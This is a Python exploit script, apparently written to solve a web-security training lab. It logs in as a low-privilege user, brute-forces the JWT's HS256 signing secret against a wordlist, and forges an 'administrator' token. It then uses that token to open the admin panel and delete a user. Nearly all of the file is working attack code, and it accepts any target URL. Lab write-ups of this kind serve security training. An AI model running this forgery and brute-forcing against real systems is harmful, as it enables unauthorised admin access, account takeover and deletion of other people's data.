import jwt
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
from requests.exceptions import RequestException
from colorama import Fore, Style

"""
Hack the World with Python 😎

--------Steps to Solve the Lab-----------

1. Login to Wiener account and fetch the JWT token signed for Wiener.
2. Brute-force the JWT and find the secret key.
3. Decode the JWT token and tamper the 'sub' value to 'administrator'.
4. Encode the tampered JWT token with the discovered secret key.
5. Send a delete request using the administrator JWT token to delete the Carlos user.
6. End with Success.

"""

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
USERNAME = "wiener"
PASSWORD = "peter"
WIENER_TOKEN = ""
WORD_LIST = "jwt.secrets.list"
LOGIN_PATH = "/login"
ADMIN_PATH = "/admin"
SECRET_KEY = ""
DELETE_USER_PATH = "/admin/delete?username=carlos"
SUCCESS_MESSAGE = "Congratulations, you solved the lab!"

def print_banner(message):
    """
    Displays a banner with the provided message.
    """
    print(Style.BRIGHT + Fore.CYAN + "=" * 60)
    print(f"{Fore.YELLOW}[ {message.upper()} ]")
    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)

def get_csrf_token(session, url):
    """
    Fetches CSRF token from the login page.
    """
    print_banner("Fetching CSRF Token")
    try:
        response = session.get(f"{url}{LOGIN_PATH}", verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf"})["value"]
        print(Fore.GREEN + "(+) CSRF Token fetched successfully." + Style.RESET_ALL)
        return csrf_token
    except (RequestException, TypeError, KeyError) as e:
        print(Fore.RED + f"(-) Failed to fetch CSRF token: {e}" + Style.RESET_ALL)
        sys.exit(1)

def login_user(session, url, username, password):
    """
    Logs in the user and returns the session token if successful.
    """
    csrf_token = get_csrf_token(session, url)
    print_banner("Logging in as Wiener")
    login_data = {"username": username, "password": password, "csrf": csrf_token}
    
    try:
        response = session.post(f"{url}{LOGIN_PATH}", data=login_data, verify=False, allow_redirects=False)
        response.raise_for_status()
        
        if "Set-Cookie" in response.headers:
            set_cookie = response.headers.get("Set-Cookie", "")
            WIENER_TOKEN = set_cookie.split("session=")[1].split(";")[0]
            print(Fore.GREEN + "(😎) Login successful. Token fetched!" + Style.RESET_ALL)
            return WIENER_TOKEN
        else:
            print(Fore.RED + "(-) Failed to log in: Session cookie not found." + Style.RESET_ALL)
            sys.exit(1)
    except RequestException as e:
        print(Fore.RED + f"(-) Login request failed: {e}" + Style.RESET_ALL)
        sys.exit(1)

def brute_force_jwt(token, wordlist):
    """
    Attempts to brute force a JWT token's signing secret using a wordlist.
    """
    print_banner("Brute-Forcing JWT Secret Key")
    try:
        header, payload, signature = token.split('.')
    except ValueError:
        print(Fore.RED + "Invalid JWT format." + Style.RESET_ALL)
        sys.exit(1)

    with open(wordlist, 'r') as file:
        for line in file:
            secret = line.strip()
            try:
                jwt.decode(token, secret, algorithms=["HS256"])
                print(Fore.GREEN + f"(+) Secret key found: {secret}" + Style.RESET_ALL)
                return secret
            except jwt.InvalidSignatureError:
                pass  # Incorrect secret, continue brute-forcing
            except Exception as e:
                print(Fore.RED + f"Error during brute force: {e}" + Style.RESET_ALL)
                sys.exit(1)
    
    print(Fore.RED + "(-) Secret not found in the provided wordlist." + Style.RESET_ALL)
    sys.exit(1)

def create_admin_token(session_token, secret_key):
    """
    Creates an admin JWT token by modifying the 'sub' claim.
    """
    print_banner("Creating Admin JWT Token")
    decoded_token = jwt.decode(session_token, secret_key, algorithms=["HS256"])
    decoded_token["sub"] = "administrator"
    admin_token = jwt.encode(decoded_token, secret_key, algorithm="HS256")
    print(Fore.GREEN + "(+) Admin token created successfully!" + Style.RESET_ALL)
    return admin_token

def perform_admin_actions(session, url, admin_token):
    """
    Logs in as an administrator and deletes the target user.
    """
    print_banner("Performing Admin Actions")
    cookies = {"session": admin_token}
    
    try:
        response = session.get(f"{url}{ADMIN_PATH}", cookies=cookies, verify=False)
        response.raise_for_status()

        if "Admin panel" in response.text:
            print(Fore.GREEN + "(+) Login as Administrator Successful!" + Style.RESET_ALL)
            print(Fore.YELLOW + "(+) Deleting Carlos account..." + Style.RESET_ALL)
            response = session.get(f"{url}{DELETE_USER_PATH}", cookies=cookies, verify=False)
            
            if SUCCESS_MESSAGE in response.text:
                print(Fore.GREEN + "(🎉) Congratulations, you solved the lab!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "(-) Failed to delete Carlos account." + Style.RESET_ALL)
        else:
            print(Fore.RED + "(-) Failed to access Admin panel." + Style.RESET_ALL)
    except RequestException as e:
        print(Fore.RED + f"(-) Admin action failed: {e}" + Style.RESET_ALL)

def validate_target(url):
    """
    Validates if the target URL is reachable.
    """
    print_banner("Validating Target URL")
    try:
        response = requests.get(url, verify=False, timeout=10)
        if response.status_code == 200:
            print(Fore.GREEN + "(+) Target is reachable." + Style.RESET_ALL)
            return True
        else:
            print(Fore.RED + f"(-) Target returned status code {response.status_code}." + Style.RESET_ALL)
            return False
    except RequestException as e:
        print(Fore.RED + f"(-) Target validation failed: {e}" + Style.RESET_ALL)
        return False

def main():
    # Argument validation
    if len(sys.argv) != 2:
        print(Fore.YELLOW + f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} http://www.example.com" + Style.RESET_ALL)
        sys.exit(1)
    
    url = sys.argv[1]
    session = requests.Session()

    # Validate target
    if not validate_target(url):
        sys.exit(1)

    # Log in and perform actions
    session_token = login_user(session, url, USERNAME, PASSWORD)
    secret_key = brute_force_jwt(session_token, WORD_LIST)
    admin_token = create_admin_token(session_token, secret_key)
    perform_admin_actions(session, url, admin_token)

if __name__ == "__main__":
    main()
